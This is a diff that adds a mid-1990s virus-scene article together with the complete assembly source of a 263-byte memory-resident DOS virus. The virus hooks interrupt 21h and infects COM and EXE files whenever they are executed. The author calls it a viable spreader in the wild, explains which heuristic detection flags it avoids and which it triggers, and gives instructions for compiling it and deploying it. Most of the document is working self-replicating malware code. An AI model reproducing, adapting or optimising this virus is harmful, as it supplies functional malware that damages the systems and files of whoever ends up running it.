@@ -1,0 +1,282 @@
+
+The Smallest Virus I Could Manage
+
+In Nuke InfoJournal #5 I foolishly boasted about a 387-byte TSR COM/EXE
+parasitic infector I'd written.. well the days of semi-lameness are gone
+(that was almost 2 years ago now) and I've come up with the goods.
+
+This is the smallest virus I could figure out at this point in time.
+In all respects it's a fully viable spreader in the wild, although it
+does have serious 'security' problems - it doesn't trap i24 (critical
+error handler), clean registers before returning control to the host, or
+even use i21 functions by chaining on to the old vector (it calls i21
+with an INT instruction).  I have no pretences in that I fully don't
+expect to see this in the wild, since it was only written for
+investigative pleasure anyway, to see how small a virus could be
+written.
+
+There was another version of this virus which I gave out to a few people
+on #virus, which had a slight bug (rather, hasty oversight) in it, where
+I changed a bit of code and didn't change a corresponding line a few
+lines later.. which results in the i21 vector being partially
+overwritten and thus the machine will crash (bad side effect!), which
+was 291 bytes.  The difference between this virus and the 'old' one is
+that this one doesn't change the target EXE file's stack, simply leaving
+it and negating the need to carry the extra 4 bytes around with the
+virus, as well as cutting code size.  Also, the 'old' one didn't trigger
+any heuristic flags whereas this one does.  (see below)
+
+This virus is a memory-resident parasitic infector of COM and EXE files
+on execution, 263 bytes.  It doesn't reinfect memory OR files.
+
+The older revision (sm2.asm, and the bug-fix, sm2b.asm) avoided all
+heuristic flags (except maybe suspicious stack); it inserted the delta
+offset straight into the first instruction of the virus, instead of
+doing the usual 'call $+3/pop si/sub si,3'.  However this just took up
+too much code and besides, it's going to get caught anyway, so why
+bother.  So in this version it was removed, but the lines are only
+commented out.  If, for some reason, you want to re-enable the old
+system, uncomment the appropriate lines and delete the lines with only a
+semicolon after them (ie not the ones with actual comments!).  Enabling
+this will bring the virus size up to all of 268 bytes.
+
+In its current form I think it's as optimized as I can make it.  Apart
+from the odd 1-byte improvement, any difference would require a change
+in viral architecture.  Some hardcore processorhead would have to do it,
+perhaps they'd get a virus of 260 bytes.. but below that, I'm sure it'd
+have to be deficient or unreliable in some respect (as far as I can
+rationally extrapolate, judging how limited this virus is in avoiding
+detection).  I'm certainly not saying that a smaller virus cannot be
+written, however, because it's probably possible.  If I could see how,
+though, I'd do it! :)  Making this smaller would require the removal of
+'safety' checks (eg bailing if the file can't be opened, bailing if the
+file is less than 24 bytes, etc).  However I consider these checks to be
+part of a viable virus, so I left them in.
+
+There isn't a great deal of commenting on this virus.  A few of the
+techniques just aren't applicable to viruses of the normal kind, so
+there's no real point.  To gain anything much out of examining this
+source you more or less have to have a good idea of what's going on
+anyway.
+
+Greets on this one go out to Dark Angel (you know why) :> ..
+
+        - T„L”N  01/95
+
+
+;---------------------------------------------------------------------------
+;
+; Smallest Virus I Could Manage - 263 bytes
+;
+; by T„L”N
+;
+; compile with a86, rename the .bin to a .com and it's ready to roll..
+;
+
+org 0
+@marker equ 19h
+
+v_start:        ; mov si, 0100h
+                call $+3        ;
+                pop si          ;
+                sub si, 3       ;
+
+                push ds
+                xor ax, ax              ; this virus resides at the end
+                mov es, ax              ; of the interrupt table & then some
+                mov di, 200h
+                push di
+                cld
+                scasw                   ; is the space clear?
+                pop di
+                jne v_exit
+
+                push si
+                mov cx, v_len
+             db 02eh                    ; make CS source of movsb
+                rep movsb               ; copy the virus to memory
+                mov si, 21h*4           ; & save old i21 vector
+                push si
+             db 26h                     ; make ES source of movsw
+                movsw
+             db 26h
+                movsw
+                pop di
+                mov ax, offset new21 + 200h
+                stosw
+                xchg ax, cx
+                stosw                   ; capture int 21h
+                pop si
+v_exit:         pop es
+                add si, offset old_shit
+                pop ax
+                or sp, sp               ; COM or EXE determination
+                push ax
+                push cs
+                pop ds
+                jnz exit_exe
+
+exit_com:       mov di, 100h            ; return to COM host
+                push di
+                movsw
+                movsw
+                ret
+exit_exe:       mov ax, es              ; return to EXE host
+                add ax, 10h
+                add word ptr [si+2], ax
+                jmp dword ptr [si]
+
+old_shit:       int 20h
+             dw 0
+
+new21:          cmp ax, 4b00h           ; infect on execute
+                je infect
+                jmp exit21
+
+infect:         push ax
+                push bx
+                push cx
+                push dx
+                push si
+                push di
+                push ds
+                push es
+
+                mov ax, 3d02h           ; open the file
+                int 21h
+                jc bitch
+
+                push cs
+                pop ds
+                push cs
+                pop es
+
+                xchg ax, bx
+                mov ah, 3fh
+                mov cx, 24
+                mov dx, offset signature+200h
+                int 21h                ; read header
+                xor cx, ax
+                jnz bitch1
+
+                mov si, dx
+                push ax
+                mov al, @marker
+                cmp byte ptr [si+3], al ; is the infection marker present? 
+                                        ;(com)
+                je bitch2
+                cmp byte ptr [si+12h], al       ; (exe)
+                je bitch2
+
+                mov ax, 4202h           ; seek to EOF  dx:ax -> file len
+                cwd
+                int 21h                 ; cx is already zero
+                push ax
+
+                mov di, offset old_shit+200h
+                cmp byte ptr [si], 'M'
+                je infect_exe
+infect_com:     push si
+                movsw                   ; save first 4 of COM
+                movsw
+                pop di
+                mov al, 0e9
+                stosb
+                pop ax
+;                inc ah
+;                mov word ptr [v_start+201h], ax
+;                sub ax, 103h
+                dec ax          ;
+                dec ax          ;
+                dec ax          ;
+                stosw
+                mov byte ptr [di], @marker      ; mark infection
+
+write_us:       mov ah, 40h
+                mov cx, v_len
+                mov dx, 200h
+                int 21h
+
+write_hdr:      mov ax, 4200h
+                cwd
+                xor cx, cx
+                int 21h
+
+                pop cx
+                mov ah, 40h
+                mov dx, offset signature+200h
+                int 21h
+
+                push ax                 ; ambiguous instruction
+
+bitch2:         pop ax
+bitch1:         mov ah, 3eh
+                int 21h
+bitch:          pop es
+                pop ds
+                pop di
+                pop si
+                pop dx
+                pop cx
+                pop bx
+                pop ax
+exit21:         jmp dword ptr cs:[old21+200h]
+
+infect_exe:     push dx
+                push si
+                mov si, offset [exe_ip+200h]
+                movsw                   ; save IP, CS
+                movsw
+                add ax, v_len           ; calculate part_page, page_cnt
+                adc dx, 0               ; of infected file
+                mov cx, 200h
+                div cx
+                pop di
+                scasw
+                scasw
+                std                     ; a novel approach..
+                or dx, dx
+                jz noinc
+                inc ax
+noinc:          stosw                   ; store the new values..
+                xchg ax, dx
+                stosw
+
+                pop dx
+                pop ax
+                mov cx, 10h             ; calculate # of paragraphs
+                div cx                  ; in the uninfected file
+                sub ax, word ptr [hdr_size+200h]
+
+                mov di, offset relo_cs+200h
+                stosw                   ; & set new IP, CS (entry pt)
+                xchg ax, dx
+                stosw
+;                mov word ptr [v_start+201h], ax
+                mov ax, @marker
+                stosw
+                jmp short write_us
+
+
+v_end:
+old21   equ     v_end + 0
+signature       equ old21 + 4           ; where we load the host files header
+part_page       equ signature + 2       ; part-page at EOF
+page_cnt        equ part_page + 2       ; count of code pages
+hdr_size        equ page_cnt + 4        ; size of header in paragraphs
+minmem          equ hdr_size + 2        ; minimum memory required
+maxmem          equ minmem + 2          ; maximum memory required
+relo_ss         equ maxmem + 2          ; displacement of stack segment (SS)
+exe_sp          equ relo_ss + 2         ; stack pointer (SP)
+chksum          equ exe_sp + 2          ; -> infection marker
+exe_ip          equ chksum + 2          ; instruction pointer (IP)
+relo_cs         equ exe_ip + 2          ; displacement of code segment (CS)
+                                        ; 24 bytes for EXE header information
+
+v_len equ v_end - v_start
+
+;
+;-------the-end-------------------------------------------------------------
+
+
+
